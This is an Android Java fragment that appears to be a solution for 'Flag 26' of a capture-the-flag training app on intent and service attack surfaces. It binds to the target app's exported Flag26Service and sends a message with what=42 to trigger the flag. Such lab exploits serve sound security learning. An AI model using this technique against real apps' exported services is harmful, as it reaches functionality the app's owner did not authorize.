package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag26Fragment extends Fragment {

    private Messenger serviceMessenger = null;
    private boolean isBound = false;

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            serviceMessenger = new Messenger(binder);
            isBound = true;
            Log.i("Flag26Fragment", "Service connected");

            // Send the message with what = 42
            Message msg = Message.obtain(null, 42);
            try {
                serviceMessenger.send(msg);
                Log.i("Flag26Fragment", "Sent message with what=42");
            } catch (RemoteException e) {
                Log.e("Flag26Fragment", "Failed to send message", e);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
            isBound = false;
            Log.w("Flag26Fragment", "Service disconnected");
        }
    };

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag26, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag26);

        launchButton.setOnClickListener(v -> {
            Log.i("Flag26Fragment", "Launch button clicked");
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service"));
            requireContext().bindService(intent, connection, Context.BIND_AUTO_CREATE);
        });

        return view;
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        if (isBound) {
            requireActivity().unbindService(connection);
            isBound = false;
        }
    }
}